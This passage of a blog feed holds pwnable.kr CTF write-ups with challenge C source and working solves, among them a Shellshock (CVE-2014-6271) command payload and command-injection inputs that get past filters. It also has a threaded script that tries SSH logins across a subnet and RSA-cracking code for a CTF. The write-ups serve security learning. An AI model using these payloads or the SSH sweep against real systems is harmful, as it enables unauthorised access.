keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> PW_LEN 10</span><span class="token macro property">#<span class="token directive keyword">define</span> XORKEY 1</span><span class="token keyword">void</span> <span class="token function">xor</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> s<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> XORKEY<span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> fd<span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/home/mistake/password"</span><span class="token punctuation">,</span>O_RDONLY<span class="token punctuation">,</span><span class="token number">0400</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"can't open password %d\n"</span><span class="token punctuation">,</span> fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"do not bruteforce...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span> pw_buf<span class="token punctuation">[</span>PW_LEN<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> len<span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>len<span class="token operator">=</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>pw_buf<span class="token punctuation">,</span>PW_LEN<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"read error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token keyword">char</span> pw_buf2<span class="token punctuation">[</span>PW_LEN<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"input password : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%10s"</span><span class="token punctuation">,</span> pw_buf2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// xor your input</span>  <span class="token function">xor</span><span class="token punctuation">(</span>pw_buf2<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>pw_buf<span class="token punctuation">,</span> pw_buf2<span class="token punctuation">,</span> PW_LEN<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Password OK\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token keyword">else</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Wrong Password\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="solve-7"><a href="#solve-7" class="headerlink" title="solve"></a>solve</h2><p>open &gt;= 0.so fd=if(0 &lt; open) = 0;</p><p>payload</p><pre><code>00000000001111111111</code></pre><p>flag</p><pre><code>Mommy, the operator priority always confuses me :(</code></pre><h1 id="10-shellshock"><a href="#10-shellshock" class="headerlink" title="10.shellshock"></a>10.shellshock</h1><p>CVE-2014-6271</p><h2 id="solve-8"><a href="#solve-8" class="headerlink" title="solve"></a>solve</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">env</span> x<span class="token operator">=</span><span class="token string">'() &amp;#123; :;&amp;#125;; /bin/cat flag'</span> ./shellshock<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flag</p><pre><code>only if I knew CVE-2014-6271 ten years ago..!!</code></pre><h1 id="11-cmd1"><a href="#11-cmd1" class="headerlink" title="11.cmd1"></a>11.cmd1</h1><h2 id="question-1"><a href="#question-1" class="headerlink" title="question"></a>question</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> cmd<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> r<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>  r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>  r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"sh"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>  r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"tmp"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> r<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> envp<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"PATH=/thankyouverymuch"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="solve-9"><a href="#solve-9" class="headerlink" title="solve"></a>solve</h2><pre class="line-numbers language-bash"><code class="language-bash">./cmd1 <span class="token string">"/bin/cat /home/cmd1/fl*"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flag</p><pre><code>mommy now I get what PATH environment is for :)</code></pre><h1 id="12-cmd2"><a href="#12-cmd2" class="headerlink" title="12.cmd2"></a>12.cmd2</h1><h2 id="question-2"><a href="#question-2" class="headerlink" title="question"></a>question</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> cmd<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> r<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>  r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"="</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>  r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"PATH"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>  r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"export"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>  r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>  r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"`"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>  r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> r<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">extern</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> environ<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">delete_env</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> p<span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>p<span class="token operator">=</span>environ<span class="token punctuation">;</span> <span class="token operator">*</span>p<span class="token punctuation">;</span> p<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">*</span>p<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> envp<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token function">delete_env</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"PATH=/no_command_execution_until_you_become_a_hacker"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="solve-10"><a href="#solve-10" class="headerlink" title="solve"></a>solve</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /tmp<span class="token function">mkdir</span> xyzzpwn<span class="token function">cd</span> xyzzpwn<span class="token keyword">echo</span> <span class="token string">"/bin/cat /home/cmd2/flag"</span> <span class="token operator">></span>xyzz<span class="token function">chmod</span> +x xyzz<span class="token function">cd</span> //home/cmd2/cmd2 <span class="token string">'<span class="token variable"><span class="token variable">$(</span><span class="token function">pwd</span><span class="token variable">)</span></span>tmp<span class="token variable"><span class="token variable">$(</span><span class="token function">pwd</span><span class="token variable">)</span></span>xyzzpwn<span class="token variable"><span class="token variable">$(</span><span class="token function">pwd</span><span class="token variable">)</span></span>xyzz'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre><code>FuN_w1th_5h3ll_v4riabl3s_haha</code></pre>]]></content>
      
      
      <categories>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.kr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>static web</title>
      <link href="/2018/06/23/static-web/"/>
      <url>/2018/06/23/static-web/</url>
      
        <content type="html"><![CDATA[<p>Because my teacher tell me to build a static web server for defend the attack.<br>I think i should do this things:</p><blockquote><p>it can defend attack. The best is nginx to show the static web file.<br>High concurrency—&gt;nginx<br>auto update -&gt; del the file for times and create new<br>can easy deploy -&gt; docker</p></blockquote><!-- more  -->]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh pi by python</title>
      <link href="/2018/06/08/ssh-pi-by-python/"/>
      <url>/2018/06/08/ssh-pi-by-python/</url>
      
        <content type="html"><![CDATA[<p>use python to scan raspberry pi</p><a id="more"></a><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#-*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">import</span> paramiko<span class="token keyword">import</span> threading<span class="token keyword">def</span> <span class="token function">ssh2</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span>username<span class="token punctuation">,</span>passwd<span class="token punctuation">,</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        ssh <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>SSHClient<span class="token punctuation">(</span><span class="token punctuation">)</span>        ssh<span class="token punctuation">.</span>set_missing_host_key_policy<span class="token punctuation">(</span>paramiko<span class="token punctuation">.</span>AutoAddPolicy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        ssh<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>ip<span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>passwd<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> m <span class="token keyword">in</span> cmd<span class="token punctuation">:</span>            stdin<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr <span class="token operator">=</span> ssh<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#           stdin.write("Y")   #简单交互，输入 ‘Y’</span>            out <span class="token operator">=</span> stdout<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#屏幕输出</span>            <span class="token keyword">for</span> o <span class="token keyword">in</span> out<span class="token punctuation">:</span>                <span class="token keyword">print</span> o<span class="token punctuation">,</span>        <span class="token keyword">print</span> <span class="token string">'%s\tOK\n'</span><span class="token operator">%</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span>        ssh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> <span class="token punctuation">:</span>        <span class="token keyword">pass</span>        <span class="token comment" spellcheck="true">#print '%s\tError\n'%(ip)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    cmd <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'echo hello!'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#你要执行的命令列表</span>    username <span class="token operator">=</span> <span class="token string">""</span>  <span class="token comment" spellcheck="true">#用户名</span>    passwd <span class="token operator">=</span> <span class="token string">""</span>    <span class="token comment" spellcheck="true">#密码</span>    threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>   <span class="token comment" spellcheck="true">#多线程</span>    <span class="token keyword">print</span> <span class="token string">"Begin......"</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        ip <span class="token operator">=</span> <span class="token string">'10.43.11.'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        a<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>ssh2<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span>username<span class="token punctuation">,</span>passwd<span class="token punctuation">,</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>        a<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> smalltrick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> raspberry pi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rsa-of-ctf-2</title>
      <link href="/2018/06/03/rsa-of-ctf-2/"/>
      <url>/2018/06/03/rsa-of-ctf-2/</url>
      
        <content type="html"><![CDATA[<h1 id="8-gcd-n1-n2"><a href="#8-gcd-n1-n2" class="headerlink" title="8.gcd(n1,n2)"></a>8.gcd(n1,n2)</h1><p>Sometimes,n1 n2 are too big to factor.you can try gcd(n1,n2)</p><a id="more"></a><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">&lt;</span> b<span class="token punctuation">:</span>        a<span class="token punctuation">,</span> b <span class="token operator">=</span> b<span class="token punctuation">,</span> a    <span class="token keyword">while</span> b <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> a <span class="token operator">%</span> b        a <span class="token operator">=</span> b        b <span class="token operator">=</span> temp    <span class="token keyword">return</span> a<span class="token keyword">def</span> <span class="token function">computeD</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> r<span class="token punctuation">)</span> <span class="token operator">=</span> extendedGCD<span class="token punctuation">(</span>fn<span class="token punctuation">,</span> e<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#y maybe &lt; 0, so convert it</span>    <span class="token keyword">if</span> y <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> fn <span class="token operator">+</span> y    <span class="token keyword">return</span> y<span class="token keyword">def</span> <span class="token function">extendedGCD</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#a*xi + b*yi = ri</span>    <span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#a*x1 + b*y1 = a</span>    x1 <span class="token operator">=</span> <span class="token number">1</span>    y1 <span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment" spellcheck="true">#a*x2 + b*y2 = b</span>    x2 <span class="token operator">=</span> <span class="token number">0</span>    y2 <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> b <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        q <span class="token operator">=</span> a <span class="token operator">/</span> b        <span class="token comment" spellcheck="true">#ri = r(i-2) % r(i-1)</span>        r <span class="token operator">=</span> a <span class="token operator">%</span> b        a <span class="token operator">=</span> b        b <span class="token operator">=</span> r        <span class="token comment" spellcheck="true">#xi = x(i-2) - q*x(i-1)</span>        x <span class="token operator">=</span> x1 <span class="token operator">-</span> q<span class="token operator">*</span>x2        x1 <span class="token operator">=</span> x2        x2 <span class="token operator">=</span> x        <span class="token comment" spellcheck="true">#yi = y(i-2) - q*y(i-1)</span>        y <span class="token operator">=</span> y1 <span class="token operator">-</span> q<span class="token operator">*</span>y2        y1 <span class="token operator">=</span> y2        y2 <span class="token operator">=</span> y    <span class="token keyword">return</span><span class="token punctuation">(</span>x1<span class="token punctuation">,</span> y1<span class="token punctuation">,</span> a<span class="token punctuation">)</span>n1 <span class="token operator">=</span> <span class="token number">28989197955870674811941817152881961892555962828020048566215146047714999804743571465320756664500939106612607504133407755470924915037883788416084924998195415611009578161228226056524027626453567996030151847302248848345942762209886902216532270655286303624781479379460319335849225128417295447574269158603952744753408534894136230960676590980945838733350143370605144754932401806068003166087495356366335014736018745371974324955357717635855207674309628146381030418983172039685916675081977078212813718313201568394044637347955108623458947913411108888733982376607647705302281273170230540579872437433435253235534772724624778056181</span>n2 <span class="token operator">=</span> <span class="token number">29703811006265969568420235185761287243393105045336995893094671661145408859269297497044834735198371987472186770953203812235003929122122129964989222762478116003185582578013431109127657242169359697936471497781547555222392181694624446976869099519331688628488881595076878345856808384797954271081176432330698334469596003760530797898645529616535584139559768170011693043197581376652770244664582733792825511473683193195672487559140733668442863818306947800631472845430628311685792799840854080385208783178691512540436222290062939858472754953657763052720510548438848633979413756332920634307585878271699119574149435107725143578613</span>c1<span class="token operator">=</span><span class="token number">14200655400630956617529154837540349350095534430543196299987252783320359338882400858000649938298574946882176873795065987640380185922571487987903069796872680567596754211592988768630729844485795253975027297563832927176988502771266530781452168489731952873297707254669904609865565861351429459102567318447934677565870915603816516557032164955329497823771897899211076176905132170360842951444390670253036307048815943908305457043184642918674003085039564350070641592716116089015861491205237748561298604957423077954850396167621218521884114394431799317165818964438359695744604198246716410783223931430682808151056020475306791729591</span>e<span class="token operator">=</span><span class="token number">0x10001</span>p <span class="token operator">=</span> gcd<span class="token punctuation">(</span>n1<span class="token punctuation">,</span>n2<span class="token punctuation">)</span>q<span class="token operator">=</span>n1<span class="token operator">/</span>pfn<span class="token operator">=</span><span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> computeD<span class="token punctuation">(</span>fn<span class="token punctuation">,</span> e<span class="token punctuation">)</span>m<span class="token operator">=</span>pow<span class="token punctuation">(</span>c1<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="9-rsa-combinations"><a href="#9-rsa-combinations" class="headerlink" title="9.rsa_combinations"></a>9.rsa_combinations</h1><p>deforce rsa………!!!!</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#! /usr/bin/python2.7</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> size<span class="token punctuation">,</span>bytes_to_long<span class="token punctuation">,</span>getStrongPrime<span class="token keyword">from</span> itertools <span class="token keyword">import</span> combinationsmsg <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span><span class="token string">"Your secret flag is : flag&amp;#123;**************************&amp;#125;"</span><span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token number">65537</span>pri <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'cipherx.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    pri<span class="token punctuation">.</span>append<span class="token punctuation">(</span>getStrongPrime<span class="token punctuation">(</span><span class="token number">1024</span><span 